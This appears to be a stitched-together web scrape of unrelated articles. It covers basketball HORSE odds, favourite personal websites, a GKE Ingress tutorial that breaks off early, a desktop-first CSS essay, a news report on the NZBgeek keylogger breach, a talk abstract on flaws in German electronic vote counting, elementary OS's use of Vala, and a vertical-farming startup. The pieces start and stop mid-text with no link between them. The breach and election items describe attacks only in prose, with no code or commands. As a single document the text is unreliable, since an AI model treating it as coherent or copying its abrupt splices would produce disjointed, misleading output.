<p><img src="https://rishicomplex.github.io/assets/player_1_worse.png" alt="Player 1 worse"></p>

<p>Interestingly, we cannot simply maximize \(p_1\) here, because once \(p_2\) gets closer to \(1\), we can never win. However, the optimal \(p_1\) is still pretty high, at around \(p_1=0.684\), giving \(e_5=11.7\). If Player 2 (for whom \(e_5\) looks like the previous section) shoots shots at \(p_2&lt;0.4\) (eg three-point shots), they will lose the game, despite being a better shooter.</p>

<h3 id="real-world-strategies">Real world strategies</h3>

<p>In the real world, winning is not the only objective. You don’t want the game to take indefinitely long, and you’d be ridiculed if you kept taking layups. You also have no concrete way to estimate \(p_1\) and \(p_2\) (unless you’ve been playing an opponent for a long time and are keeping a tab on their shooting percentages), and so have to rely on intuition. Some general points to keep in mind:</p>

<ul>
  <li>You’re generally better off taking high percentage shots, even if you’re much better at a low-percentage shot than an opponent. As an example, let’s say you’ve been practicing half-court shots all year, and you can shoot a half court shot at an impressive 20% (\(p_1=0.2\)). You’re sure your opponent can’t shoot that shot if you make it (\(p_2=0\)). Your expected number of turns to win is still \(e_5=21\). Compare that to you shooting a 60% shot which your opponent can also make at 60% (eg a free throw), which lets you win in \(e_5=9.3\) turns. This is more than twice as good as the half court shot! This is because if you and your opponent both make the shot, it’s still your turn. Whereas if you miss your shot by attempting a low percentage shot, your turn is over. You can always win the game in 6-7 turns simply by taking layups at the same percentage as your opponent (assuming \(p_1\) of 0.8-0.9). If we set \(p_2=0\), and solve for \(e_5=7\), we get \(p_1 = 0.45\). That is, even if your opponent can’t make the shot you make at all, there’s generally no point in taking shots that have \(p_1 &lt; 0.45\) - you’re better off shooting layups.</li>
  <li>If you can guess \(p_1\) and \(p_2\) for a bunch of candidate shots, plug them into \(\eqref{eq:one}\) to figure out which shots are your best bet to win.</li>
  <li>Instead of practicing low percentage shots (like behind the backboard arc shots), practice your high percentage shots (like free throws or left handed layups) instead. If you and your opponent can both make a behind the backboard arc shot at 10%, and you practice to push yourself to 20%, you still go from winning in 51 turns to 23 turns. Compare that with converting your free throw from 60% to 70% - that pushes your expected turns from 9.3 to 6.4.</li>
  <li>Find novel-looking high percentage shots so that you can use an effective strategy while not getting ridiculed for just attempting layups. Examples are left handed close up shots, floaters, bank shots.</li>
</ul>

<p>I’d also recommend playing HORSE with modified rules, eg</p>
<ul>
  <li>No shots from inside the paint.</li>
  <li>No repeated shots from the same spot in a turn.</li>
  <li>If both players make three shots in a row, it’s Player 2’s turn.</li>
</ul>

<p>This should reduce the effectiveness of the layup strategy and make the game more fun.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I chose five personal websites out of the thirty or so I visit regularly and tried to understand what it is about them that utterly captures me.</p>
<p>Whether or not it is obvious to you, I have stolen many things from the following websites. Be it design tweaks, post ideas, or even turns of phrase. These websites are incredible and you should consume them.</p>
<p>Good artists borrow, great artists <del>steal</del> use the inspect tool.</p>

<p>I have been following Justin Duke’s writing for close to two years. His older page is now <a href="https://jmduke.com/">depreciated</a> and he posts to <em>arcana dot computer</em>, an <a href="https://github.com/jmduke/arcana.computer">open source</a> website filled with catalogs and footnotes and light-touch design. The main framework is Jekyll, with dynamic content powered by Airtable. The <a href="https://arcana.computer/miscellany/this-site.html">About</a> page of Justin’s website explains the development/design/ideas behind the website in rich detail. So in this section I’ll instead focus on how I <em>feel</em> about the website.</p>
<p><span>
      <a href="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png" target="_blank" rel="noopener">

  </a>
    </span></p>
<p>My philosophy towards personal websites matches Justin’s. He writes:</p>
<blockquote>
<p>Lastly, if there’s anything I can convince you of: you should build a personal site, you should obsess over it, you should meticulously document it, and you should have quite a bit of fun doing so. (It’s worth it.)</p>
</blockquote>
<p>The content throughout these pages is personal and reads true. Although it’s not a journal as such, as I read through the notes and reviews I get a secret feeling that I’m looking somewhere I shouldn’t be — like peeking in a hidden diary.</p>
<p>Justin writes about capturing his <a href="https://arcana.computer/catalogs/media-diet">media diet</a>:</p>
<blockquote>
<p>This started out as a lazy compulsion, but I’ve grown rather found of this habit over time. “You are what you eat”, and all that — I’ve realized that paying more attention to how I’m spending my consumptive time has made me more focused on consuming what I’m interested in, and not simply what’s easiest.</p>
</blockquote>
<p>He talks about reviewing older sections of his media diet and how it helps him recollect that time in his life — “suddenly I am taken back to my old apartment on Capitol Hill, and my three weeks of funemployment before Stripe”. When coming across old words that I have written, I’ve also experienced this almost-olfactory flashback of thoughts.</p>
<p><span>

  </a>
    </span></p>
<p>Overall, I am impressed with the breadth and depth of content on Justin’s website, as well as how he’s made Airtable work for him. I also like that sections are marked as in-progress. I like the personal structure to it. His methods for working on this website are similar to the goals of the <a href="https://en.wikipedia.org/wiki/Long_Now_Foundation">Long Now</a> and that gels with me.</p>

<p>Paul Stamatiou writes long form articles about his life and technology. If someone has a curiosity about a subject that he has covered (e.g. <a href="https://paulstamatiou.com/made-on-an-ipad-pro/">creating with the iPad Pro</a>, or <a href="https://paulstamatiou.com/building-a-windows-10-lightroom-photo-editing-pc/">building a lightroom PC</a>) I wouldn’t hesitate linking one of his articles to them — perhaps without even reading it — because of the consistent high quality I have come to expect.</p>
<p><span>
      <a href="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" target="_blank" rel="noopener">

  <img alt="Paul Stamatiou's website." title="Paul Stamatiou's website." src="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" srcset="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/a8a0d/paulstamatiou.com.png 300w,

  </a>
    </span></p>
<p>However, this quality comes with a cost, as he describes in <a href="https://paulstamatiou.com/writing-more/">Writing more</a>:</p>
<blockquote>
<p>I’m going to try something different and write more short-form posts here.</p>
</blockquote>
<blockquote>
<p>Over the years my focus has been increasing the quality of my articles. They’ve ended up becoming increasingly time-consuming to create.</p>
</blockquote>
<p>Although these articles (which for now he seems to have dubbed “briefs”) are shorter and less researched than his other writing they read as complete entries to me. On another website, by another person, they would be complete blog posts.</p>
<p>The more things I write, the more hesitant I am to actually publish. So the way he talks about blogging in <em>Writing more</em> resonates with me:</p>
<blockquote>
<p>I want to get back to what blogging felt like when I started in 2005. Back when posting a few sentences and publishing it within the same computing session was so easy and fun. Where expectations were low and it didn’t have to be perfect.</p>
</blockquote>
<p>He has written 1210 posts since 2005. My first thought goes to the build times of such a website! In 2011, he migrated from <a href="https://paulstamatiou.com/how-to-wordpress-to-jekyll/">Wordpress to Jekyll</a>. This year he <a href="https://twitter.com/Stammy/status/1307347164599922689">tweeted</a> that he’s looking at moving again:</p>
<blockquote>
<p>really, really want to migrate my jekyll blog to Hugo + Netlify but I have so many weird jekyll hacks and collections and templates/includes that I’m sure the migration would take months of spare time.</p>
</blockquote>
<blockquote>
<p>probably faster to build a new site from the ground up, new CSS and all</p>
</blockquote>
<p>Also this year, he was interviewed about his work (he’s a designer at Twitter) and about his blog on <a href="https://www.thundernerds.io/2019/10/writing-a-blog-and-working-at-twitter-with-paul-stamatiou/">Thunder Nerds</a>. (More people should be interviewed about their technology blogs please.)</p>
<p>Paul is a photographer who generates fantastic photo sets and write ups with little animated maps of the location. His <a href="https://paulstamatiou.com/photos/">photos</a>, and the way they are arranged, is truly fantastic. He has of course written <a href="https://paulstamatiou.com/photos/gear/">thousands of words</a> about his camera gear.</p>

<p>Martin Tournoij is the creator of <a href="https://www.goatcounter.com/">Goat Counter</a> and has posts dating back to 2013. His personal website is Jekyll-based and <a href="https://github.com/arp242/arp242.net">open source</a>.

<p>I like the one-page layout of the landing page. There’s a list of posts and projects, a picture, and a link to his CV. My favorite post of his is <a href="https://www.arp242.net/personal-analytics.html">Analytics on personal websites</a> — where he argues in part for vanity statistics:</p>
<blockquote>
<p>As for “vanity stats” or “stats to stroke your ego”: I think that’s actually a valid use case as well. After you spent quite a bit of your spare time writing an article it’s just nice to know people are actually reading it. There’s nothing wrong with being validated – it’s a basic psychological need and I’m not a fan of casually dismissing it.</p>
</blockquote>
<p>Later on, he wrestles with the fact that since he’s the creator of an analytics tool, he doesn’t want this website to turn into an advertising channel for it.</p>
<p>Martin doesn’t shy away from controversial subjects on his blog. He writes about freedom and democracy, he pushes for empathy towards those he disagrees with. He writes without restraint which is admirable in itself.</p>
<p>He uses his own CSS template (<a href="https://github.com/arp242/hello-css">arp242/hello-css</a>) which is worth a look. If you’ll allow me to use a vague statement, his website has a unique visual readability to it.</p>

<p>Joel Califa’s website has whimsy. It doesn’t take itself seriously.</p>

<p>Clicking this button makes text spawn and fly away and fade (the snippets are things from the old web like: <code>&lt;i&gt;</code>, <code>&lt;frameset&gt;</code>, <code>&lt;marquee&gt;</code>, etc). There’s an illustration of his head that hides away when you hover near. The writing in the section headers frizzles with energy.</p>
<p>Joel’s website successfully serves as both a work portfolio and a design blog. His <em>Work</em> page describes itself as a “A sample of text-heavy case studies for patient visitors.” The design blog has “Low frequency, high quality design articles.”</p>
<p>My favorite post is <a href="http://joelcalifa.com/blog/tiny-wins/">Tiny Wins</a>:</p>
<blockquote>
<p>I recently shipped two things at GitHub that had an impact beyond my wildest dreams.</p>
</blockquote>
<p>Where he discusses the work involved in designing dynamic favicons for the Pull Request page:</p>
<blockquote>
<p>Now browser tabs will always show a PR’s current build status.</p>
</blockquote>
<p>As well as adding an arrow that signals which branch your changes are “flowing” into:</p>
<blockquote>
<p>Before releasing this, people would regularly confuse which branch would be merged into which.</p>
</blockquote>
<p>He writes with authentic authority. He covers subjects that seem so obvious after you read them. Like in <a href="http://joelcalifa.com/blog/revisiting-visited/">Revisiting :Visited</a>, where research, the web specification, and its practical uses, are combined:</p>
<blockquote>
<p>A Nielsen study summed this up nicely over ten years ago, “People get lost and move in circles when websites use the same link color for visited and new destinations. To reduce navigational confusion, select different colors for the two types of links.”</p>
</blockquote>
<blockquote>
<p>Can’t we, as an industry, get behind that reasoning? A “visited” link isn’t that far off from a “read” email. They both provide the user with the tacit understanding of where they’ve been.</p>
</blockquote>
<p>Joel exists in the wonderful space between technology and design where he is addressing problems that directly relate to me. For example, his website is the first place I read <a href="http://joelcalifa.com/blog/unsolicited-dating-advice/">a serious defense</a> of the <code>month/day/year</code> date ordering system.</p>
<p>It fills me with joy that I have only read half of his content.</p>

<p>Rasmus Andersson has the prettiest website in this list. An elegant three-column layout that perfectly scales to the browser’s width — dropping to two columns then one column. When a page is selected from the top right menu, the background changes to a rich color and shifts the menu up or down. With a wide enough browser, gray bars frame the website on either side.</p>

<p>Rasmus is the creator of the <a href="https://rsms.me/inter/">Inter</a> font and uses it to great effect with bold hover colors.</p>
<p><span>

  </a>
    </span></p>
<p>Even his <a href="https://rsms.me/bad-url">404 page</a> is sharp.</p>
<p>After looking around more, I found a <code>&lt;script&gt;</code> tag that includes <a href="https://rsms.me/res/main.js">main.js</a>, a debug tool that must have been used to develop the grid layout (which I think is based on <a href="https://rsms.me/raster/">rsms/raster</a>). Pressing alt+D or alt+G overlays a system of boxes and dots.</p>

    </span></p>
<p>Rasmus’s last post was in 2017 — <a href="https://rsms.me/wasm-intro">Introduction to WebAssembly</a> — but it’s one that I revisit often as it’s a clear and detailed explanation of the technology.</p>
<p>His use of the right arrow symbol (U+2192) as well as the rounded hover effect on titles (e.g. “Projects” and “Thoughts and ideas”) is something that I closely copied for my own website as it is just too perfect.</p>
<p>Like Paul Stamatiou, Rasmus has hundreds of articles and has been blogging for a long time – almost two decades. The earlier posts are more likely to be reblogs, quotes, links, and small thoughts. The kind of things that Twitter is now used for.</p>
<p>Unlike Twitter, the permanence of these small thoughts is poetic. Here, in 2002, a new font is announced next to something like a diary entry without a paragraph break in between:</p>
<blockquote>
<p>I’ve completed a new typeface. It’s a sweet little thing called Hovden Stitch. Yes your guess was correct. It looks like stitches, cross-stitches to be precise. Go get it for your mac or pc right here. Yesterday I hung out on a free festival here in Trollhättan. Laurel Music was great. Paola sucked. Laurel Music is playing …</p></blockquote></section></div>

When you create an Ingress object, the GKE Ingress controller creates a Google Cloud HTTP(S) load balancer and configures it according to the information in the Ingress and its associated Services.</p> <p>This article describes how to setup Ingress for External HTTP(S) Load Balancing, install cert-manager certificate provisioner and setup up a Let’s Encrypt certificate. This was written based on GKE <a href="https://cloud.google.com/kubernetes-engine/docs/release-notes-stable#february_11_2020">v1.14.10-gke.17</a>, <a href="https://cert-manager.io/">cert-manager</a> v0.13 and <a href="https://helm.sh/">Helm</a> v3.</p> <h2 id="prerequisites">Prerequisites</h2> <ul> <li><a href="https://cloud.google.com/kubernetes-engine/docs/how-to/creating-a-cluster">A GKE Kubernetes cluster</a></li> <li><a href="https://helm.sh/docs/intro/install/">Helm</a></li> <li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">Kubectl</a></li> <li><a href="https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address">A global static IP</a> with <a href="https://cloud.google.com/kubernetes-engine/docs/tutorials/configuring-domain-name-static-ip#step_4_configure_your_domain_name_records">DNS configured</a> for your domain for example, as example.your-domain.com. Regional IP addresses do not work with GKE Ingress.</li> </ul> <p>Note that a Service exposed through an Ingress must respond to health checks from the load balancer. According to the <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/ingress#health_checks">docs</a>, your app must either serve a response with an HTTP 200 status to GET requests on the / path, or you can configure an HTTP readiness probe, serving a response with an HTTP 200 status to GET requests on the path specified by the readiness probe.</p> <h2 id="create-a-deployment">Create a deployment</h2> <p>Here is an example of a sample deployment manifest.</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>apps/v1</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>(This article was originally published in </em><a target="_blank" title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>How To Debug CSS</em></a><em>)</em></p><p>While I could always understand the idea behind the mobile-first approach to developing websites. It always felt….off to me.</p><p>Mobile-first, which is a design approach that involves starting with the mobile version of a website before the desktop version, is a great idea in theory.&nbsp;</p><p>The problem comes when it meets reality.</p><p>There are countless stories of developers who, upon hearing about (and even learning how to design with) a mobile first approach, ultimately ended up reverting back to, and starting with the desktop versions of their sites.</p><p>According to a <a target="_blank" title="https://twitter.com/KevinJPowell/status/1244427032957784066" href="https://twitter.com/KevinJPowell/status/1244427032957784066">survey</a> conducted by Kevin Powell (a GREAT frontend tutorial maker), the majority (61.5%) of developers prefer to start with the desktop first:</p><p><img src="https://media.graphcms.com/gkrvHBiXR3ON7pcIkwSG" alt="Screenshot 2020-12-27 at 22.39.13.png" title="Screenshot 2020-12-27 at 22.39.13.png" width="597" height="413"></p><p><em><strong>(this after almost 8 years of the mobile-first approach being championed almost exclusively)</strong></em></p><p>This is a sentiment that I have also found to be true on many message boards and online discussions that I’ve seen around responsive web design.</p><p>It is interesting that despite this clear evidence that the majority of developers simply do not inherently want to design websites with a mobile-first approach, the idea is still being championed as the preferred methodology.</p><p>Let’s explore why this is.</p><h2>Why Mobile-First is often championed</h2><p>There are two main reasons why the mobile-first approach is often touted as the best approach to take for developing a responsive website:</p><p>	<strong>1.	Better UX, at every screen size </strong></p><p>The first is that it provides a better user experience at every screen size, because it best optimizes for the smaller screen sizes as well as the larger ones. The argument is that it does this by focusing on only the most important elements of the layout, as that is all that can fit on the smaller mobile screens. And that this focused approach ‘scales up’.</p><p>The trouble with this is that it simply does not seem to hold up to scrutiny.&nbsp;</p><p>What actually seems to end up happening with mobile-first is that the overall site just becomes less creative in general.&nbsp;</p><p>Most mobile sites (and their subsequent desktop sites) end up simply looking the same as every other website out there.</p><p>We’ll see why this is the case shortly (the diagram at the top of this post will give you an idea).</p><p>	<strong>2.	Better organized (and easier to create) CSS </strong></p><p>The second reason why mobile-first is often regarded as the best way to develop a responsive website is that on most sites, the ‘default’ CSS styles (i.e. the styles that are written outside of the scope of media queries) are often the ones that are aimed at the smaller, mobile screen sizes.&nbsp;</p><p><strong>Typical CSS file organization for a responsive website:</strong></p><p><img src="https://media.graphcms.com/output=format:png/resize=height:748,width:996/sPcNpTKARkKzOUO3KzZ4" alt="typical-css-responsive-file.png" title="typical-css-responsive-file.png" width="996" height="748"></p><p>Because the typical CSS workflow of a responsive website is to add the media query related styles after the fact (because media queries are supposed to be at the bottom of the page, as mentioned above), starting with what would be your ‘default’ styles, which would be your mobile styles, seems to make more sense.</p><p>We will also shortly see why this is not exactly correct.</p><p>Let’s dive into the key reasons why, despite these two decent arguments in favor of a mobile-first approach to responsive web design, it still is not the best way to approach it.</p><h2>Why mobile-first is good in theory but bad in practice</h2><h3>You are optimizing for the sub-optimal experience</h3><p>The mobile experience <em>is</em> sub-optimal. This is not a point that is really debated. The entire point of a mobile version of a site is to deliver a lesser, but still somewhat effective version of the optimal desktop experience.</p><p>The problem with optimizing for the mobile experience, is that it does not make the overall experience optimal. It only scales up sub-optimality. The compromises that start on the mobile experience ultimately become compromises on the desktop end.</p><p><strong>It only degrades the desktop experience.</strong></p><p>The desktop site is the ‘real’ site in most cases, <a target="_blank" title="https://www.reddit.com/r/webdev/comments/d7nj58/how_do_you_deal_with_mobile_first_and/" href="https://www.reddit.com/r/webdev/comments/d7nj58/how_do_you_deal_with_mobile_first_and/">most clients</a> expect to see a desktop site first.</p><p>Desktop-first focuses on the design problem that people actually care about, while mobile-first focuses on the CSS organization problem, which only developers do.</p><p>Instead of starting with the sub-optimal experience (that helps the developer), it’s much better overall to optimize for the optimal experience (that helps the user) and then scale down.</p><h3>It’s an unnatural way to design</h3><p>Because design is an intuitive process fundamentally, any design approach that requires you to have to ‘get over yourself’ is probably a bad idea.</p><p>Design is basically a process of guiding the user, by developing an interface based on what guides <em>you</em>, naturally.</p><p>For this to be effective, context is key, and being able to maximally utilize the scope of experience that the user has, gives you more ‘surface area’ with which to appropriately meet the context and guide the user.</p><p>For this reason, It’s better to start at the ‘largest’ possible context for this.&nbsp;</p><p>For example, for a professional sports match. What has a better chance of delivering the ‘fullest’, more complete experience to you?&nbsp;</p><p><strong>The actual, ‘bigger’, more natural, live game:</strong></p><p><img src="https://media.graphcms.com/p5ESEubnQNKm7eEPdLmR" alt="man-290186_1920.jpg" title="man-290186_1920.jpg" width="1920" height="1275"></p><p><strong>Or the TV experience?</strong></p><p><img src="https://media.graphcms.com/qUwYVApRW22XXnKOCOqd" alt="soccer-3496510_1920.jpg" title="soccer-3496510_1920.jpg" width="1920" height="1280"></p><p><em><strong>What should be optimized for first to deliver the best final result in both cases?</strong></em></p><p>The Desktop experience encompasses what is essential information within a mobile context. Mobile does not necessarily have what is essential to a desktop context.</p><p>This is why desktop-first <a target="_blank" title="https://www.reddit.com/r/webdev/comments/cy1xuk/do_you_feel_like_desktop_web_dev_is_fun_and/" href="https://www.reddit.com/r/webdev/comments/cy1xuk/do_you_feel_like_desktop_web_dev_is_fun_and/">seems to feel more natural</a> to most developers. It’s just enough constraint for the task of navigating a website, but not too much.</p><p>Leaving an ideal amount of room for creativity. Which mobile-first kills.</p><h3>Mobile-first kills creativity</h3><p>With mobile-first, there are too many unanswered questions.</p><p>Questions that should have been answered at the desktop level, ultimately never get answered.</p><p>At the desktop level, the challenges are often much bigger, and require more creativity to solve. Because the questions you need to ask at smaller screens are simply fractals (or subsets) of their larger counterparts, It’s much better to answer them first at the larger sizes, which then makes it easier to answer subsequent smaller size and mobile design questions.</p><p>With a mobile-first approach, you can fall into the trap of getting so fixated on the subsets that you fail in giving people the essence of the page. This essence is what the initial answers to the bigger design questions give you.</p><p>To get that essence, in the same way that you would have to crush grapes at scale, and then gradually go through a distillation process to finally achieve a wine. To get a mobile site that really gets to the core of a site, its best to start with the desktop version. And then gradually filter or scale down.</p><h3>Mobile-First makes design too formulaic</h3><p>Because of the degree of constraint in the mobile-first approach, and the lack of room for creativity that this engenders, developers naturally seek out tried and true patterns that they can follow.&nbsp;</p><p>This isn't a bad thing, as we all use inspiration to a degree. The issue is that, just as we’ve seen with frameworks like Bootstrap. Too much of a formulaic approach often leads to a level of sameness that literally bores everyone.</p><p>Mobile-first may be one the things contributing to the ever increasing ‘sameness’ of the web that we see nowadays.</p><p>This consequently reduces the kind of web activity that we want (such as conversions) across the board. People are simply less engaged, and tuning these websites out.</p><p>Imagine if those ever-quirky and endlessly interesting sites of the late 90’s, early 2000’s like the ones we used to find on GeoCities and Angelfire were thinking about ‘mobile first’.&nbsp;</p><p>Do you think they would have achieved the same level of uniqueness? I doubt it.</p><h2>An alternative (desktop-first) approach</h2><p>The mental shift that we should make is not desktop to mobile first.</p><p>It's not to simply squish things on the desktop either.</p><p>The correct mental shift is to say, once we have a desktop version, what do we need to resize, rearrange, or remove in order to have an optimal yet still equally informative experience on mobile?</p><p>We should be asking how we can make the mobile experience a good fractal of the desktop experience.&nbsp;</p><p>We should ask what we are trying to achieve with our desktop site, and how we can achieve (even if only a little bit) the same on smaller screens.</p><p>The way that we should design our websites should be to start with the desktop first, and then scale down with empathy, asking the big designs questions before we start to ask the smaller ones.</p><p>We should start our web design process at the bottom of the CSS file, with the desktop sized media query, instead of making those first global (mobile-first) styles.&nbsp;</p><p>After that, once we have answered our biggest design questions at the desktop level, we can scale down (and up in the code) with more media queries (in the case of the smaller sizes) and with the default global styles in the case of the absolute smallest mobile size. Taking out all but the necessary.&nbsp;</p><p>Ultimately, this feels like the most natural approach to take.</p><p>--</p><p><em>This is an excerpt from </em><a title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>How To Debug CSS</em></a><em>.

<p>NZBgeek is a very popular community-based indexer of Usenet posts. It is run by using the Newznab Interface. NZBgeek provides paid and free services for its own users, plus so they truly have been reasonable to think about.</p>
<p>On the evening of 27 December 2020, NZBgeek announced that they got hacked and the following details of their users are breached in this hacking attack on their community website:</p>
<ol>
<li>Username</li>
<li>Encrypted passwords</li>
<li>Email Address</li>
<li>Credit Card Numbers</li>
</ol>
<h3 id="rtoc-1">How this Attack was Performed?</h3>
<p>According to the announcement post by @Dangerous_Mummy and @jeeves in their Discord server, this attack and data breach happened because the attacker installed a Keylogger on the website of NZBgeek.</p>
<p>@Dangerous_Mummy written:</p>
<blockquote><p><span tabindex="-1" role="button">@everyone</span> Geeks, it’s with a heavy heart that we must admit that we have had a breach. If you have recently used your card or payment with us we suggest changing your credentials and card info as soon as possible. We still don’t know the extent of the damage but are working to find out and give our members the details as they become available.</p></blockquote>
<p>@jeeves written:</p>
<blockquote><p>@everyone</p>
<p>Hey Geeks,</p>
<p>IMPORTANT!</p>
<p>If you have used your card with us since the 20th November 2020 please take appropriate action.<br>
This includes reporting it to your card issuer as this protects you from any unlawful charges.</p>
<p>What We Know:</p>
<p>The hackers were able to place a keylogger on the website.<br>
The hackers obtained a copy of our database which includes your username, encrypted password, email address &amp; last connected ip address.<br>
During this time we had the hard drive on our indexer fail along with an api server.<br>
PayPal data is not at risk provding you do not use the same username/password for NZBgeek.</p>
<p>Advised Actions:</p>
<p>If you use the same userame/password combination on any other website please change them.<br>
You should use 2FA/two factor authticaition with all your online accounts.</p>
<p>Current Situation:</p>
<p>We have everything offline except for the API while we have external help to investigate.<br>
Additional updates will be made here on discord, including what changes to expect moving forward.</p>
<p>Thanks,<br>
jeeves</p></blockquote>
<p>It is one of the major data breaches because the payment information is breached and is available in the hands of attackers.</p>

<h3 id="rtoc-2">What actions users should take?</h3>
<ol>
<li>If you use the same password on multiple accounts, immediately change the passwords of all your accounts</li>
<li>Contact your credit card provider and block your card to stop further unauthorized transactions</li>
<li>Use 2FA on all of your websites/accounts whenever possible.</li>

<!-- %h3 About -->
<p>After the first unsuccessful deployment of voting machines in Germany about ten years ago, elements of electronic voting have reached elections again. Although there is now still a paper-trail, more and more essential steps, such as counting the votes, are moved into electronic systems. This change in the ballot-counting procedure took place mostly unnoticed by the public. We are two very concerned election workers who present our first-hand experience in this talk. We show that the current digital procedure is conceptually and practically flawed in terms of security. First, we give an insight into the role of computers and their interaction with humans during ballot-counting. We show that the underlying system concepts contradict IT-security best-practices. Next, we present an in-depth analysis of one ballot-counting software, deployed for the Bavarian municipal elections ("Kommunalwahlen"). We discovered several severe security vulnerabilities that allow an almost unnoticeable manipulation of local voting results. Finally, we conclude that there is an immediate need for action to re-establish election security and transparency - not only for the government but for everyone of us.</p>

<p>Elections are a key element of every democracy. However, many democratic countries in the world have to face attacks on them, be it by the government or by foreign countries. Even if ballot counting has been finished, election results are often not accepted but questioned due to alleged manipulations. All these aspects pose major threats to democracy as they try to undermine the actual and publicly perceived integrity of elections.</p>

<p>In Germany, elections are usually considered quite secure. Elections are paper-based and the subsequent ballot-counting is open to the public. The infamous introduction of electronic voting machines about ten years ago was finally stopped by the German Federal Constitutional Court. Thus, everything is human-controlled, transparent, and secure – isn’t it?</p>

<p>Unfortunately, these claims are questionable since the silent introduction of electronic vote counting. The election system in Germany is quite complex, for example in the "Kreistagswahlen" (~district elections) workers have to count up to 70 individual votes per ballot, while respecting a special rule set. This process is very labor-intensive and sufficient election workers are often hard to come by. Due to this, electronic systems were introduced that provide support during vote counting. Election workers are no longer required to fill tally sheets, count votes, and sum them up on their own. Each ballot is simply entered into a software that performs all the magic and finally emits a result.</p>

<p>This year, we volunteered again as election workers, but our trust in electronically-assisted elections has been vastly impacted. As IT-security researchers, we consider it our responsibility to share and discuss our concerns. We performed a thorough analysis of the concept and the hard- and software of the electronic vote counting system. We discovered several flaws on a conceptual and practical level, that can severely diminish the integrity of the election and makes it prone to manipulations. To underline the impact of the system’s vulnerabilities, we demonstrate an exemplary attack on an election.</p>

<p>Finally, we propose different options on how to make elections secure again. We do not consider this an entirely technical case, as there are significant legal and societal circumstances that led to the deployment of this insecure system.</p>

<p>If you follow elementary OS development, you may know that we do not write our applications on C or Python, but rather a language called <a rel="nofollow noopener noreferrer" target="_blank" href="https://wiki.gnome.org/Projects/Vala">Vala</a>. While it is true that a more mainstream language would lower the barrier to entry for new first-party and third-party developers, Vala has proven to be a tremendously effective tool for our needs.</p>

<p>Vala is an object-oriented programming language developed by the <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.gnome.org/">GNOME Foundation</a>, which was first released in 2006. Syntax-wise, Vala looks and acts very similarly to Java or C#, which makes it easy for new contributors to leverage their knowledge and experience from other languages. Vala’s clear syntax and tight coupling with the strongly-typed GObject system promotes highly readable, expressive, and maintainable code, while preventing entire classes of crashes and bugs.</p>

<p>Since Vala compiles to C (and then into binary), we gain access to a large number of bindings for libraries written in C. This is extremely important given the number of C libraries available for the Linux desktop. All of our desktop applications are written using the <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.gtk.org/">GTK</a> toolkit, and many rely heavily on related GObject-based libraries, including Gee, WebKitGTK, VTE, and GStreamer. Bindings for dozens of popular GObject C libraries exist, and writing new ones is easy.</p>

<p>Before we adopted Vala, we wrote our desktop applications in Python. As both a language and a platform, Python made developing apps quick and easy. However, this ease of development came at a serious cost — performance, binding support, and maintainability became major pain points for us with Python. Worse, the slow and fragmented adoption of Python 3 over Python 2, particularly across Linux distributions, made packaging our apps and developer tools for different environments tedious and challenging. Vala’s native binaries have proven to be a better fit for us.</p>

  <figcaption>A Simple GTK Application in&nbsp;Vala</figcaption>
</figure>

<p>Because Vala is developed by the same incredible folks who make GTK, integration between Vala and GTK is tight. Extending GTK with Vala has also proven successful. In fact, we’ve crafted our own set of widgets that build on and complement what GTK provides by default. This super-set of GTK, called <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/elementary/granite">Granite</a>, is at the heart of nearly every elementary application, and Vala’s excellent object-oriented inheritance system, among other sophisticated language features, have been key to our development.</p>

<p>Vala has excellent documentation, be it in the form of <a rel="nofollow noopener noreferrer" target="_blank" href="https://chebizarro.gitbooks.io/the-vala-tutorial/content/">tutorials</a>, <a rel="nofollow noopener noreferrer" target="_blank" href="https://wiki.gnome.org/Projects/Vala/Examples">code samples</a> or a <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/">very easy-to-use API Reference</a>. So if you’re interested in <a rel="nofollow noopener noreferrer" target="_blank" href="https://elementary.io/get-involved">hacking on our projects</a> (which we very much appreciate — we are always looking for new contributors!), or are planning to release fantastic third-party desktop applications for elementary OS, we can’t recommend Vala enough. Dive in!</p>

	<p><a href="https://www.plenty.ag/" target="_blank" rel="noopener">Plenty</a> is an ag-tech startup in San Francisco, co-founded by Nate Storey, that is reinventing farms and farming. Storey, who is also the company’s chief science officer, says the future of farms is vertical and indoors because that way, the food can grow anywhere in the world, year-round; and the future of farms employ robots and AI to continually improve the quality of growth for fruits, vegetables, and herbs. Plenty does all these things and uses 95% less water and 99% less land because of it.</p>
<p>In recent years, farmers on flat farms have been using new tools for making farming better or easier. They’re using drones and robots to improve crop maintenance, while artificial intelligence is also on the rise, with over 1,600 startups and total investments reaching tens of billions of dollars. Plenty is one of those startups. However, flat farms still use a lot of water and land, while a Plenty vertical farm can produce the same quantity of fruits and vegetables as a 720-acre flat farm, but on only 2 acres!</p>
<p>Storey said:</p>
<blockquote><p>Vertical farming exists because we want to grow the world’s capacity for fresh fruits and vegetables, and we know it’s necessary.</p></blockquote>
<p><span><iframe width="1400" height="788" src="https://www.youtube.com/embed/GO0fRU46ZHc?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-GB&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
